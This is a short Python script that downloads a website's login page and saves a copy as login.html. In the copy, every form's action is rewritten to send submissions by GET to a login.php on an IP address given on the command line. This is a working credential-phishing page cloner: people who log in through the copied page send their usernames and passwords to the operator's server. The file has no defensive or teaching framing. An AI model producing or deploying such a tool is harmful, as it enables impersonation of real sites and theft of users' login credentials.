import requests
import pathlib
import sys
import ipaddress


def main() -> None:
    path = str(pathlib.Path(__file__).parent.joinpath("login.html"))
    try:
        response = requests.get(input("Please enter a login page URL: "))
        data = response.content.decode().split('\n')
        for i, line in enumerate(data):
            if 'action=' in line:
                lst = line.split()
                for j, expression in enumerate(lst):
                    if 'action=' in expression:
                        lst[j] = f'action="http://{IP}/login.php"'
                    elif 'method=' in expression:
                        lst[j] = 'method="get"'
                data[i] = " ".join(lst)
        with open(path, "wb") as f:
            f.write('\n'.join(data).encode())
    except requests.exceptions.RequestException as err:
        print(err)


if __name__ == "__main__":
    IP = sys.argv[1]
    main()
